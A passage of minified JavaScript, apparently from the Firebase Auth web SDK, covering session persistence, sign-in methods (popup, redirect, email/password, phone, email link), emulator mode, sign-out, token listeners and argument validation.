          a.redirectEventId && (e.wc = a.redirectEventId),
          e
        );
      },
      Ir = function (a, b, c, d) {
        var e = new R(a, b);
        return (
          c && (e.xc = c),
          d && gr(e, d),
          e.reload().then(function () {
            return e;
          })
        );
      },
      Jr = function (a, b, c, d) {
        b = b || { apiKey: a.ha, authDomain: a.ya, appName: a.ka };
        var e = a.Nb,
          f = {};
        return (
          (f.idToken = e.Wa && e.Wa.toString()),
          (f.refreshToken = e.Ta),
          (b = new R(b, f)),
          c && (b.xc = c),
          d && gr(b, d),
          b.copy(a),
          b
        );
      };
    O(R.prototype, "providerId", "firebase");
    var Kr = function (a) {
        (this.V = a), (this.O = Tp());
      },
      Fr = function (a) {
        return a.O.remove(Er, a.V);
      },
      Lr = function (a, b) {
        return a.O.get(Er, a.V).then(function (c) {
          return c && b && (c.authDomain = b), Hr(c || {});
        });
      },
      Er = { name: "redirectUser", ua: "session" },
      Nr = function (a) {
        (this.V = a),
          (this.O = Tp()),
          (this.Xa = null),
          (this.Zg = this.Pg()),
          this.O.addListener(Mr("local"), this.V, u(this.rm, this));
      };
    Nr.prototype.rm = function () {
      var a = this,
        b = Mr("local");
      Or(this, function () {
        return F()
          .then(function () {
            return a.Xa && "local" != a.Xa.ua ? a.O.get(b, a.V) : null;
          })
          .then(function (c) {
            if (c)
              return Pr(a, "local").then(function () {
                a.Xa = b;
              });
          });
      });
    };
    var Pr = function (a, b) {
      var d,
        c = [];
      for (d in Pp) Pp[d] !== b && c.push(a.O.remove(Mr(Pp[d]), a.V));
      return c.push(a.O.remove(Qr, a.V)), sg(c);
    };
    Nr.prototype.Pg = function () {
      var a = this,
        b = Mr("local"),
        c = Mr("session"),
        d = Mr("none");
      return Vp(this.O, b, this.V)
        .then(function () {
          return a.O.get(c, a.V);
        })
        .then(function (e) {
          return e
            ? c
            : a.O.get(d, a.V).then(function (f) {
                return f
                  ? d
                  : a.O.get(b, a.V).then(function (g) {
                      return g
                        ? b
                        : a.O.get(Qr, a.V).then(function (h) {
                            return h ? Mr(h) : b;
                          });
                    });
              });
        })
        .then(function (e) {
          return (a.Xa = e), Pr(a, e.ua);
        })
        .l(function () {
          a.Xa || (a.Xa = b);
        });
    };
    var Mr = function (a) {
      return { name: "authUser", ua: a };
    };
    Nr.prototype.setPersistence = function (a) {
      var b = null,
        c = this;
      return (
        Qp(a),
        Or(this, function () {
          return a != c.Xa.ua
            ? c.O.get(c.Xa, c.V)
                .then(function (d) {
                  return (b = d), Pr(c, a);
                })
                .then(function () {
                  if (((c.Xa = Mr(a)), b)) return c.O.set(c.Xa, b, c.V);
                })
            : F();
        })
      );
    };
    var Rr = function (a) {
        return Or(a, function () {
          return a.O.set(Qr, a.Xa.ua, a.V);
        });
      },
      Sr = function (a, b) {
        return Or(a, function () {
          return a.O.set(a.Xa, b.T(), a.V);
        });
      },
      Tr = function (a) {
        return Or(a, function () {
          return a.O.remove(a.Xa, a.V);
        });
      },
      Ur = function (a, b, c) {
        return Or(a, function () {
          return a.O.get(a.Xa, a.V).then(function (d) {
            return (
              d && b && (d.authDomain = b),
              d && c && (d.emulatorConfig = c),
              Hr(d || {})
            );
          });
        });
      },
      Or = function (a, b) {
        return (a.Zg = a.Zg.then(b, b)), a.Zg;
      },
      Qr = { name: "persistence", ua: "session" },
      T = function (a) {
        if (
          (yj.call(this),
          (this.wb = !1),
          (this.Jj = new Ap()),
          O(this, "settings", this.Jj),
          O(this, "app", a),
          !this.U().options || !this.U().options.apiKey)
        )
          throw new P("invalid-api-key");
        (a = firebase.SDK_VERSION ? sl("JsCore", firebase.SDK_VERSION) : null),
          (this.o = new mn(
            this.U().options && this.U().options.apiKey,
            Tk(Uk),
            a
          )),
          (this.Ka = []),
          (this.Dc = []),
          (this.Md = []),
          (this.Fl = firebase.INTERNAL.createSubscribe(u(this.nl, this))),
          (this.Ie = void 0),
          (this.Il = firebase.INTERNAL.createSubscribe(u(this.ol, this))),
          Vr(this, null),
          (a = this.U().options.apiKey);
        var b = this.U().name;
        (this.Pb = new Nr(a + ":" + b)),
          (a = this.U().options.apiKey),
          (b = this.U().name),
          (this.Sc = new Kr(a + ":" + b)),
          (this.Le = this.v(Wr(this))),
          (this.Lb = this.v(Xr(this))),
          (this.rf = !1),
          (this.Hg = u(this.sm, this)),
          (this.Xj = u(this.oc, this)),
          (this.Nd = u(this.Kg, this)),
          (this.Vj = u(this.al, this)),
          (this.Wj = u(this.bl, this)),
          (this.W = null),
          Yr(this),
          (this.INTERNAL = {}),
          (this.INTERNAL.delete = u(this.delete, this)),
          (this.INTERNAL.logFramework = u(this.yl, this)),
          (this.Ic = 0),
          Zr(this),
          (this.Ea = []),
          (this.N = null);
      };
    n(T, yj),
      (T.prototype.setPersistence = function (a) {
        return (a = this.Pb.setPersistence(a)), this.v(a);
      }),
      (T.prototype.Gd = function (a) {
        this.Gb === a ||
          this.wb ||
          ((this.Gb = a),
          on(this.o, this.Gb),
          this.dispatchEvent(new $r(this.Gb)));
      }),
      (T.prototype.useDeviceLanguage = function () {
        var a = p.navigator;
        this.Gd(
          (a &&
            ((a.languages && a.languages[0]) ||
              a.language ||
              a.userLanguage)) ||
            null
        );
      }),
      (T.prototype.useEmulator = function (a, b) {
        if (!this.N) {
          if (this.W)
            throw new P(
              "argument-error",
              "useEmulator() must be called immediately following firebase.auth() initialization."
            );
          (b = !!b && !!b.disableWarnings),
            as(b),
            (this.N = { url: a, disableWarnings: b }),
            (this.Jj.fg = !0),
            qn(this.o, this.N),
            this.dispatchEvent(new bs(this.N));
        }
      });
    var as = function (a) {
      "undefined" != typeof console &&
        "function" == typeof console.info &&
        console.info(
          "WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."
        ),
        p.document &&
          !a &&
          il().then(function () {
            var b = p.document.createElement("p");
            (b.innerText =
              "Running in emulator mode. Do not use with production credentials."),
              (b.style.position = "fixed"),
              (b.style.width = "100%"),
              (b.style.backgroundColor = "#ffffff"),
              (b.style.border = ".1em solid #000000"),
              (b.style.color = "#b50000"),
              (b.style.bottom = "0px"),
              (b.style.left = "0px"),
              (b.style.margin = "0px"),
              (b.style.zIndex = 1e4),
              (b.style.textAlign = "center"),
              b.classList.add("firebase-emulator-warning"),
              p.document.body.appendChild(b);
          });
    };
    (T.prototype.yl = function (a) {
      this.Ea.push(a),
        rn(
          this.o,
          firebase.SDK_VERSION
            ? sl("JsCore", firebase.SDK_VERSION, this.Ea)
            : null
        ),
        this.dispatchEvent(new cs(this.Ea));
    }),
      (T.prototype.Ch = function (a) {
        this.ma === a || this.wb || ((this.ma = a), (this.o.ma = this.ma));
      });
    var Zr = function (a) {
      Object.defineProperty(a, "lc", {
        get: function () {
          return this.Gb;
        },
        set: function (b) {
          this.Gd(b);
        },
        enumerable: !1,
      }),
        (a.Gb = null),
        Object.defineProperty(a, "ti", {
          get: function () {
            return this.ma;
          },
          set: function (b) {
            this.Ch(b);
          },
          enumerable: !1,
        }),
        (a.ma = null),
        Object.defineProperty(a, "emulatorConfig", {
          get: function () {
            if (this.N) {
              var b = M(this.N.url);
              b = Ql({
                protocol: b.Va,
                host: b.Ga,
                port: b.Tb,
                options: Ql({ disableWarnings: this.N.disableWarnings }),
              });
            } else b = null;
            return b;
          },
          enumerable: !1,
        });
    };
    T.prototype.toJSON = function () {
      return {
        apiKey: this.U().options.apiKey,
        authDomain: this.U().options.authDomain,
        appName: this.U().name,
        currentUser: U(this) && U(this).T(),
      };
    };
    var ds = function (a) {
        return a.Ek || G(new P("auth-domain-config-required"));
      },
      Yr = function (a) {
        var b = a.U().options.authDomain,
          c = a.U().options.apiKey;
        b &&
          wl() &&
          (a.Ek = a.Le.then(function () {
            if (!a.wb) {
              if (
                ((a.W = Eq(b, c, a.U().name, a.N)),
                a.W.subscribe(a),
                U(a) && pr(U(a)),
                a.yc)
              ) {
                pr(a.yc);
                var d = a.yc;
                d.Gd(a.Gb),
                  hr(d, a),
                  (d = a.yc),
                  gr(d, a.Ea),
                  jr(d, a),
                  (d = a.yc),
                  fr(d, a.N),
                  ir(d, a),
                  (a.yc = null);
              }
              return a.W;
            }
          }));
      };
    (k = T.prototype),
      (k.Wh = function (a, b) {
        switch (a) {
          case "unknown":
          case "signInViaRedirect":
            return !0;
          case "signInViaPopup":
            return this.Kb == b && !!this.Jb;
          default:
            return !1;
        }
      }),
      (k.Tc = function (a, b, c, d) {
        "signInViaPopup" == a &&
          this.Kb == d &&
          (c && this.Rc ? this.Rc(c) : b && !c && this.Jb && this.Jb(b),
          this.La && (this.La.cancel(), (this.La = null)),
          delete this.Jb,
          delete this.Rc);
      }),
      (k.Yd = function (a, b) {
        return "signInViaRedirect" == a ||
          ("signInViaPopup" == a && this.Kb == b && this.Jb)
          ? u(this.Ik, this)
          : null;
      }),
      (k.Ik = function (a, b, c, d) {
        var e = this,
          f = { requestUri: a, postBody: d, sessionId: b, tenantId: c };
        return (
          this.La && (this.La.cancel(), (this.La = null)),
          e.Le.then(function () {
            return es(e, sm(e.o, f));
          })
        );
      }),
      (k.Xe = function () {
        return tl();
      }),
      (k.signInWithPopup = function (a) {
        if (!wl())
          return G(new P("operation-not-supported-in-this-environment"));
        var b = this,
          c = Wl(a.providerId),
          d = this.Xe(),
          e = null;
        (!xl() || ml()) &&
          this.U().options.authDomain &&
          a.isOAuthProvider &&
          (e = Bo(
            this.U().options.authDomain,
            this.U().options.apiKey,
            this.U().name,
            "signInViaPopup",
            a,
            null,
            d,
            firebase.SDK_VERSION || null,
            null,
            null,
            this.ma,
            this.N
          ));
        var f = dl(e, c && c.zd, c && c.yd);
        return (
          (c = ds(this)
            .then(function (g) {
              return g.qe(f, "signInViaPopup", a, d, !!e, b.ma);
            })
            .then(function () {
              return new E(function (g, h) {
                b.Tc(
                  "signInViaPopup",
                  null,
                  new P("cancelled-popup-request"),
                  b.Kb
                ),
                  (b.Jb = g),
                  (b.Rc = h),
                  (b.Kb = d),
                  (b.La = b.W.Ae(b, "signInViaPopup", f, d));
              });
            })
            .then(function (g) {
              return f && cl(f), g ? Ql(g) : null;
            })
            .l(function (g) {
              throw (f && cl(f), g);
            })),
          this.v(c)
        );
      }),
      (k.signInWithRedirect = function (a) {
        if (!wl())
          return G(new P("operation-not-supported-in-this-environment"));
        var b = this,
          c = ds(this)
            .then(function () {
              return Rr(b.Pb);
            })
            .then(function () {
              return b.W.re("signInViaRedirect", a, void 0, b.ma);
            });
        return this.v(c);
      });
    var fs = function (a) {
      if (!wl()) return G(new P("operation-not-supported-in-this-environment"));
      var b = ds(a)
        .then(function () {
          return a.W.getRedirectResult();
        })
        .then(function (c) {
          return c ? Ql(c) : null;
        });
      return a.v(b);
    };
    (T.prototype.getRedirectResult = function () {
      var a = this;
      return fs(this)
        .then(function (b) {
          return a.W && a.W.ad(), b;
        })
        .l(function (b) {
          throw (a.W && a.W.ad(), b);
        });
    }),
      (T.prototype.updateCurrentUser = function (a) {
        if (!a) return G(new P("null-user"));
        if (this.ma != a.tenantId) return G(new P("tenant-id-mismatch"));
        var b = this,
          c = {};
        (c.apiKey = this.U().options.apiKey),
          (c.authDomain = this.U().options.authDomain),
          (c.appName = this.U().name);
        var d = Jr(a, c, b.Sc, Ua(b.Ea));
        return this.v(
          this.Lb.then(function () {
            if (b.U().options.apiKey != a.ha) return d.reload();
          })
            .then(function () {
              return U(b) && a.uid == U(b).uid
                ? (U(b).copy(a), b.oc(a))
                : (Vr(b, d), pr(d), b.oc(d));
            })
            .then(function () {
              b.rc();
            })
        );
      });
    var gs = function (a, b) {
        var c = {};
        return (
          (c.apiKey = a.U().options.apiKey),
          (c.authDomain = a.U().options.authDomain),
          (c.appName = a.U().name),
          a.N && (c.emulatorConfig = a.N),
          a.Le.then(function () {
            return Ir(c, b, a.Sc, Ua(a.Ea));
          })
            .then(function (d) {
              return U(a) && d.uid == U(a).uid
                ? (U(a).copy(d), a.oc(d))
                : (Vr(a, d), pr(d), a.oc(d));
            })
            .then(function () {
              a.rc();
            })
        );
      },
      Vr = function (a, b) {
        U(a) &&
          (nr(U(a), a.Xj),
          vj(U(a), "tokenChanged", a.Nd),
          vj(U(a), "userDeleted", a.Vj),
          vj(U(a), "userInvalidated", a.Wj),
          mr(U(a))),
          b &&
            (b.Pf.push(a.Xj),
            nj(b, "tokenChanged", a.Nd),
            nj(b, "userDeleted", a.Vj),
            nj(b, "userInvalidated", a.Wj),
            0 < a.Ic && lr(b)),
          O(a, "currentUser", b),
          b &&
            (b.Gd(a.Gb), hr(b, a), gr(b, a.Ea), jr(b, a), fr(b, a.N), ir(b, a));
      };
    T.prototype.signOut = function () {
      var a = this,
        b = this.Lb.then(function () {
          return (
            a.W && a.W.ad(),
            U(a)
              ? (Vr(a, null),
                Tr(a.Pb).then(function () {
                  a.rc();
                }))
              : F()
          );
        });
      return this.v(b);
    };
    var hs = function (a) {
        var b = a.U().options.authDomain;
        return (
          (b = Lr(a.Sc, b).then(function (c) {
            return (a.yc = c) && (c.xc = a.Sc), Fr(a.Sc);
          })),
          a.v(b)
        );
      },
      Wr = function (a) {
        var b = a.U().options.authDomain,
          c = hs(a)
            .then(function () {
              return Ur(a.Pb, b, a.N);
            })
            .then(function (d) {
              return d
                ? ((d.xc = a.Sc),
                  a.yc && (a.yc.wc || null) == (d.wc || null)
                    ? d
                    : d
                        .reload()
                        .then(function () {
                          return Sr(a.Pb, d).then(function () {
                            return d;
                          });
                        })
                        .l(function (e) {
                          return "auth/network-request-failed" == e.code
                            ? d
                            : Tr(a.Pb);
                        }))
                : null;
            })
            .then(function (d) {
              Vr(a, d || null);
            });
        return a.v(c);
      },
      Xr = function (a) {
        return a.Le.then(function () {
          return fs(a);
        })
          .l(function () {})
          .then(function () {
            if (!a.wb) return a.Hg();
          })
          .l(function () {})
          .then(function () {
            if (!a.wb) {
              a.rf = !0;
              var b = a.Pb;
              b.O.addListener(Mr("local"), b.V, a.Hg);
            }
          });
      };
    (k = T.prototype),
      (k.sm = function () {
        var a = this,
          b = this.U().options.authDomain;
        return Ur(this.Pb, b).then(function (c) {
          if (!a.wb) {
            var d;
            if ((d = U(a) && c)) {
              d = U(a).uid;
              var e = c.uid;
              d = null != d && "" !== d && null != e && "" !== e && d == e;
            }
            if (d) return U(a).copy(c), U(a).getIdToken();
            (U(a) || c) &&
              (Vr(a, c),
              c && (pr(c), (c.xc = a.Sc)),
              a.W && a.W.subscribe(a),
              a.rc());
          }
        });
      }),
      (k.oc = function (a) {
        return Sr(this.Pb, a);
      }),
      (k.Kg = function () {
        this.rc(), this.oc(U(this));
      }),
      (k.al = function () {
        this.signOut();
      }),
      (k.bl = function () {
        this.signOut();
      });
    var es = function (a, b) {
      var c = null,
        d = null;
      return a.v(
        b
          .then(
            function (e) {
              return (c = bn(e)), (d = Op(e)), gs(a, e);
            },
            function (e) {
              var f = null;
              throw (
                (e &&
                  "auth/multi-factor-auth-required" === e.code &&
                  (f = Mq(e.T(), a, u(a.Jg, a))),
                f || e)
              );
            }
          )
          .then(function () {
            return Ql({
              user: U(a),
              credential: c,
              additionalUserInfo: d,
              operationType: "signIn",
            });
          })
      );
    };
    (k = T.prototype),
      (k.Jg = function (a) {
        var b = this;
        return this.Lb.then(function () {
          return es(b, F(a));
        });
      }),
      (k.nl = function (a) {
        var b = this;
        this.addAuthTokenListener(function () {
          a.next(U(b));
        });
      }),
      (k.ol = function (a) {
        var b = this;
        is(this, function () {
          a.next(U(b));
        });
      }),
      (k.onIdTokenChanged = function (a, b, c) {
        var d = this;
        return (
          this.rf &&
            firebase.Promise.resolve().then(function () {
              "function" == typeof a
                ? a(U(d))
                : "function" == typeof a.next && a.next(U(d));
            }),
          this.Fl(a, b, c)
        );
      }),
      (k.onAuthStateChanged = function (a, b, c) {
        var d = this;
        return (
          this.rf &&
            firebase.Promise.resolve().then(function () {
              (d.Ie = d.getUid()),
                "function" == typeof a
                  ? a(U(d))
                  : "function" == typeof a.next && a.next(U(d));
            }),
          this.Il(a, b, c)
        );
      }),
      (k.Nk = function (a) {
        var b = this,
          c = this.Lb.then(function () {
            return U(b)
              ? U(b)
                  .getIdToken(a)
                  .then(function (d) {
                    return { accessToken: d };
                  })
              : null;
          });
        return this.v(c);
      }),
      (k.signInWithCustomToken = function (a) {
        var b = this;
        return this.Lb.then(function () {
          return es(b, Q(b.o, lo, { token: a }));
        }).then(function (c) {
          var d = c.user;
          return vr(d, "isAnonymous", !1), b.oc(d), c;
        });
      }),
      (k.signInWithEmailAndPassword = function (a, b) {
        var c = this;
        return this.Lb.then(function () {
          return es(c, Q(c.o, Mm, { email: a, password: b }));
        });
      }),
      (k.createUserWithEmailAndPassword = function (a, b) {
        var c = this;
        return this.Lb.then(function () {
          return es(c, Q(c.o, fo, { email: a, password: b }));
        });
      }),
      (k.signInWithCredential = function (a) {
        var b = this;
        return this.Lb.then(function () {
          return es(b, a.Kc(b.o));
        });
      }),
      (k.signInAndRetrieveDataWithCredential = function (a) {
        return (
          Ml(
            "firebase.auth.Auth.prototype.signInAndRetrieveDataWithCredential is deprecated. Please use firebase.auth.Auth.prototype.signInWithCredential instead."
          ),
          this.signInWithCredential(a)
        );
      }),
      (k.signInAnonymously = function () {
        var a = this;
        return this.Lb.then(function () {
          var b = U(a);
          if (b && b.isAnonymous) {
            var c = Ql({ providerId: null, isNewUser: !1 });
            return Ql({
              user: b,
              credential: null,
              additionalUserInfo: c,
              operationType: "signIn",
            });
          }
          return es(a, a.o.signInAnonymously()).then(function (d) {
            var e = d.user;
            return vr(e, "isAnonymous", !0), a.oc(e), d;
          });
        });
      }),
      (k.U = function () {
        return this.app;
      });
    var U = function (a) {
      return a.currentUser;
    };
    T.prototype.getUid = function () {
      return (U(this) && U(this).uid) || null;
    };
    var js = function (a) {
      return (U(a) && U(a)._lat) || null;
    };
    (k = T.prototype),
      (k.rc = function () {
        if (this.rf) {
          for (var a = 0; a < this.Dc.length; a++)
            this.Dc[a] && this.Dc[a](js(this));
          if (this.Ie !== this.getUid() && this.Md.length)
            for (this.Ie = this.getUid(), a = 0; a < this.Md.length; a++)
              this.Md[a] && this.Md[a](js(this));
        }
      }),
      (k.jk = function (a) {
        this.addAuthTokenListener(a),
          this.Ic++,
          0 < this.Ic && U(this) && lr(U(this));
      }),
      (k.Sl = function (a) {
        var b = this;
        x(this.Dc, function (c) {
          c == a && b.Ic--;
        }),
          0 > this.Ic && (this.Ic = 0),
          0 == this.Ic && U(this) && mr(U(this)),
          this.removeAuthTokenListener(a);
      }),
      (k.addAuthTokenListener = function (a) {
        var b = this;
        this.Dc.push(a),
          this.v(
            this.Lb.then(function () {
              b.wb || (Qa(b.Dc, a) && a(js(b)));
            })
          );
      }),
      (k.removeAuthTokenListener = function (a) {
        Ta(this.Dc, function (b) {
          return b == a;
        });
      });
    var is = function (a, b) {
      a.Md.push(b),
        a.v(
          a.Lb.then(function () {
            !a.wb &&
              Qa(a.Md, b) &&
              a.Ie !== a.getUid() &&
              ((a.Ie = a.getUid()), b(js(a)));
          })
        );
    };
    (k = T.prototype),
      (k.delete = function () {
        this.wb = !0;
        for (var a = 0; a < this.Ka.length; a++)
          this.Ka[a].cancel("app-deleted");
        return (
          (this.Ka = []),
          this.Pb && (a = this.Pb).O.removeListener(Mr("local"), a.V, this.Hg),
          this.W && (this.W.unsubscribe(this), this.W.ad()),
          firebase.Promise.resolve()
        );
      }),
      (k.v = function (a) {
        var b = this;
        return (
          this.Ka.push(a),
          a.Ac(function () {
            Ra(b.Ka, a);
          }),
          a
        );
      }),
      (k.fetchSignInMethodsForEmail = function (a) {
        return this.v(Bn(this.o, a));
      }),
      (k.isSignInWithEmailLink = function (a) {
        return !!Qm(a);
      }),
      (k.sendSignInLinkToEmail = function (a, b) {
        var c = this;
        return this.v(
          F()
            .then(function () {
              var d = new Bp(b);
              if (!d.Xh)
                throw new P(
                  "argument-error",
                  "handleCodeInApp must be true when sending sign in link to email"
                );
              return Cp(d);
            })
            .then(function (d) {
              return c.o.sendSignInLinkToEmail(a, d);
            })
            .then(function () {})
        );
      }),
      (k.verifyPasswordResetCode = function (a) {
        return this.checkActionCode(a).then(function (b) {
          return b.data.email;
        });
      }),
      (k.confirmPasswordReset = function (a, b) {
        return this.v(this.o.confirmPasswordReset(a, b).then(function () {}));
      }),
      (k.checkActionCode = function (a) {
        return this.v(
          this.o.checkActionCode(a).then(function (b) {
            return new em(b);
          })
        );
      }),
      (k.applyActionCode = function (a) {
        return this.v(this.o.applyActionCode(a).then(function () {}));
      }),
      (k.sendPasswordResetEmail = function (a, b) {
        var c = this;
        return this.v(
          F()
            .then(function () {
              return void 0 === b || Ya(b) ? {} : Cp(new Bp(b));
            })
            .then(function (d) {
              return c.o.sendPasswordResetEmail(a, d);
            })
            .then(function () {})
        );
      }),
      (k.signInWithPhoneNumber = function (a, b) {
        return this.v(Ep(this, a, b, u(this.signInWithCredential, this)));
      }),
      (k.signInWithEmailLink = function (a, b) {
        var c = this;
        return this.v(
          F().then(function () {
            b = b || Xk();
            var d = Rm(a, b),
              e = Qm(b);
            if (!e) throw new P("argument-error", "Invalid email link!");
            if (e.tenantId !== c.ma) throw new P("tenant-id-mismatch");
            return c.signInWithCredential(d);
          })
        );
      });
    var $r = function (a) {
      Zi.call(this, "languageCodeChanged"), (this.languageCode = a);
    };
    n($r, Zi);
    var bs = function (a) {
      Zi.call(this, "emulatorConfigChanged"), (this.emulatorConfig = a);
    };
    n(bs, Zi);
    var cs = function (a) {
      Zi.call(this, "frameworkChanged"), (this.Lk = a);
    };
    n(cs, Zi);
    var ls = function (a, b, c, d) {
        a: {
          c = Array.prototype.slice.call(c);
          for (var e = 0, f = !1, g = 0; g < b.length; g++)
            if (b[g].optional) f = !0;
            else {
              if (f)
                throw new P(
                  "internal-error",
                  "Argument validator encountered a required argument after an optional argument."
                );
              e++;
            }
          if (((f = b.length), c.length < e || f < c.length))
            d =
              "Expected " +
              (e == f
                ? 1 == e
                  ? "1 argument"
                  : e + " arguments"
                : e + "-" + f + " arguments") +
              " but got " +
              c.length +
              ".";
          else {
            for (e = 0; e < c.length; e++)
              if (
                ((f = b[e].optional && void 0 === c[e]), !b[e].Ca(c[e]) && !f)
              ) {
                if (((c = e), (b = b[e]), 0 > c || c >= ks.length))
                  throw new P(
                    "internal-error",
                    "Argument validator received an unsupported number of arguments."
                  );
                (c = ks[c]),
                  (d =
                    (d ? "" : c + " argument ") +
                    (b.name ? '"' + b.name + '" ' : "") +
                    "must be " +
                    b.Fa +
                    ".");
                break a;
              }
            d = null;
          }
        }
        if (d) throw new P("argument-error", a + " failed: " + d);
      },
      ks = "First Second Third Fourth Fifth Sixth Seventh Eighth Ninth".split(
        " "
      ),
      V = function (a, b) {
        return {
          name: a || "",
          Fa: "a valid string",
          optional: !!b,
          Ca: function (c) {
            return "string" == typeof c;
          },
        };
      },
      ms = function (a, b) {
        return {
          name: a || "",
          Fa: "a boolean",
          optional: !!b,
          Ca: function (c) {
            return "boolean" == typeof c;
          },
        };
      },
      W = function (a, b) {
        return { name: a || "", Fa: "a valid object", optional: !!b, Ca: t };
      },
      ns = function (a, b) {
        return { name: a || "", Fa: "a function", optional: !!b, Ca: Jc };
      },
      os = function (a, b) {
        return {
          name: a || "",
          Fa: "null",
          optional: !!b,
          Ca: function (c) {
            return null === c;
          },
        };
      },
      ps = function () {
        return {
          name: "",
          Fa: "an HTML element",
          optional: !1,
          Ca: function (a) {
            return !!(a && a instanceof Element);
          },
        };
      },
      qs = function () {
        return {
          name: "auth",
          Fa: "an instance of Firebase Auth",
          optional: !0,
          Ca: function (a) {
            return !!(a && a instanceof T);
          },
        };
      },
      rs = function () {
        return {
          name: "app",
          Fa: "an instance of Firebase App",
          optional: !0,
          Ca: function (a) {
            return !!(a && a instanceof firebase.app.App);
          },
        };
      },
      ss = function (a) {
        return {
          name: a ? a + "Credential" : "credential",
          Fa: a ? "a valid " + a + " credential" : "a valid credential",
          optional: !1,
          Ca: function (b) {
            if (!b) return !1;
            var c = !a || b.providerId === a;
            return !(!b.Kc || !c);
          },
        };
      },
      ts = function () {
        return {
          name: "multiFactorAssertion",
          Fa: "a valid multiFactorAssertion",
          optional: !1,
          Ca: function (a) {
            return !!a && !!a.process;
          },
        };
      },
      us = function () {
        return {
          name: "authProvider",
          Fa: "a valid Auth provider",
          optional: !1,
          Ca: function (a) {
            return !!(
              a &&
              a.providerId &&
              a.hasOwnProperty &&
              a.hasOwnProperty("isOAuthProvider")
            );
          },
        };
      },
      vs = function (a, b) {
        return (
          t(a) &&
          "string" == typeof a.type &&
          a.type === b &&
          "function" == typeof a.Zd
        );
      },
      ws = function (a) {
        return t(a) && "string" == typeof a.uid;
      },
      xs = function () {
        return {
          name: "applicationVerifier",
          Fa: "an implementation of firebase.auth.ApplicationVerifier",
          optional: !1,
          Ca: function (a) {
            return !(
              !a ||
              "string" != typeof a.type ||
              "function" != typeof a.verify
            );
          },
        };
      },
      X = function (a, b, c, d) {
        return {
          name: c || "",
          Fa: a.Fa + " or " + b.Fa,
          optional: !!d,
          Ca: function (e) {
            return a.Ca(e) || b.Ca(e);
          },
        };
      },
      Y = function (a, b) {
        for (var c in b) {
          var d = b[c].name;
          a[d] = ys(d, a[c], b[c].j);
        }
      },
      zs = function (a, b) {
        for (var c in b) {
          var d = b[c].name;
          d !== c &&
            Object.defineProperty(a, d, {
              get: za(function (e) {
                return this[e];
              }, c),
              set: za(
                function (e, f, g, h) {
                  ls(e, [g], [h], !0), (this[f] = h);
                },
                d,
                c,
                b[c].hg
              ),
              enumerable: !0,
            });
        }
      },
      Z = function (a, b, c, d) {
        a[b] = ys(b, c, d);
      },
      ys = function (a, b, c) {
        if (!c) return b;
        var d = As(a);
        for (var e in ((a = function () {
          var g = Array.prototype.slice.call(arguments);
          return ls(d, c, g), b.apply(this, g);
        }),
        b))
          a[e] = b[e];
        for (var f in b.prototype) a.prototype[f] = b.prototype[f];
        return a;
      },
      As = function (a) {
        return (a = a.split("."))[a.length - 1];
      };
    function Bs() {}
    O(Bs, "FACTOR_ID", "phone"),
      Y(T.prototype, {
        applyActionCode: { name: "applyActionCode", j: [V("code")] },
        checkActionCode: { name: "checkActionCode", j: [V("code")] },
        confirmPasswordReset: {
          name: "confirmPasswordReset",
          j: [V("code"), V("newPassword")],
        },
        createUserWithEmailAndPassword: {
          name: "createUserWithEmailAndPassword",
          j: [V("email"), V("password")],
        },
        fetchSignInMethodsForEmail: {
          name: "fetchSignInMethodsForEmail",
          j: [V("email")],
        },
        getRedirectResult: { name: "getRedirectResult", j: [] },
        isSignInWithEmailLink: {
          name: "isSignInWithEmailLink",
          j: [V("emailLink")],
        },
        onAuthStateChanged: {
          name: "onAuthStateChanged",
          j: [
            X(W(), ns(), "nextOrObserver"),
            ns("opt_error", !0),
            ns("opt_completed", !0),
          ],
        },
        onIdTokenChanged: {
          name: "onIdTokenChanged",
          j: [
            X(W(), ns(), "nextOrObserver"),
            ns("opt_error", !0),
            ns("opt_completed", !0),
          ],
        },
        sendPasswordResetEmail: {
          name: "sendPasswordResetEmail",
          j: [
            V("email"),
            X(
              W("opt_actionCodeSettings", !0),
              os(null, !0),
              "opt_actionCodeSettings",
              !0
            ),
          ],
        },
        sendSignInLinkToEmail: {
          name: "sendSignInLinkToEmail",
          j: [V("email"), W("actionCodeSettings")],
        },
        setPersistence: { name: "setPersistence", j: [V("persistence")] },
        signInAndRetrieveDataWithCredential: {
          name: "signInAndRetrieveDataWithCredential",
          j: [ss()],
        },
        signInAnonymously: { name: "signInAnonymously", j: [] },
        signInWithCredential: { name: "signInWithCredential", j: [ss()] },
        signInWithCustomToken: {
          name: "signInWithCustomToken",
          j: [V("token")],
        },
        signInWithEmailAndPassword: {
          name: "signInWithEmailAndPassword",
          j: [V("email"), V("password")],
        },
        signInWithEmailLink: {
          name: "signInWithEmailLink",
          j: [V("email"), V("emailLink", !0)],
        },
        signInWithPhoneNumber: {
          name: "signInWithPhoneNumber",
          j: [V("phoneNumber"), xs()],
        },
        signInWithPopup: { name: "signInWithPopup", j: [us()] },
        signInWithRedirect: { name: "signInWithRedirect", j: [us()] },
        updateCurrentUser: {
          name: "updateCurrentUser",
          j: [
            X(
              {
                name: "user",
                Fa: "an instance of Firebase User",
                optional: !1,
                Ca: function (b) {
                  return !!(b && b instanceof R);
                },
              },
              os(),
              "user"
            ),
          ],
        },
        signOut: { name: "signOut", j: [] },
        toJSON: { name: "toJSON", j: [V(null, !0)] },
        useDeviceLanguage: { name: "useDeviceLanguage", j: [] },
        useEmulator: { name: "useEmulator", j: [V("url"), W("options", !0)] },
        verifyPasswordResetCode: {
          name: "verifyPasswordResetCode",
          j: [V("code")],
        },
      }),
      zs(T.prototype, {
        lc: { name: "languageCode", hg: X(V(), os(), "languageCode") },
        ti: { name: "tenantId", hg: X(V(), os(), "tenantId") },
      }),
      (T.Persistence = Pp),
      (T.Persistence.LOCAL = "local"),
      (T.Persistence.SESSION = "session"),
      (T.Persistence.NONE = "none"),
      Y(R.prototype, {
        delete: { name: "delete", j: [] },
        getIdTokenResult: {
          name: "getIdTokenResult",
          j: [ms("opt_forceRefresh", !0)],
        },
        getIdToken: { name: "getIdToken", j: [ms("opt_forceRefresh", !0)] },
        linkAndRetrieveDataWithCredential: {
          name: "linkAndRetrieveDataWithCredential",
          j: [ss()],
        },
        linkWithCredential: { name: "linkWithCredential", j: [ss()] },
        linkWithPhoneNumber: {
          name: "linkWithPhoneNumber",
          j: [V("phoneNumber"), xs()],
        },
        linkWithPopup: { name: "linkWithPopup", j: [us()] },
        linkWithRedirect: { name: "linkWithRedirect", j: [us()] },
        reauthenticateAndRetrieveDataWithCredential: {
          name: "reauthenticateAndRetrieveDataWithCredential",
          j: [ss()],
        },
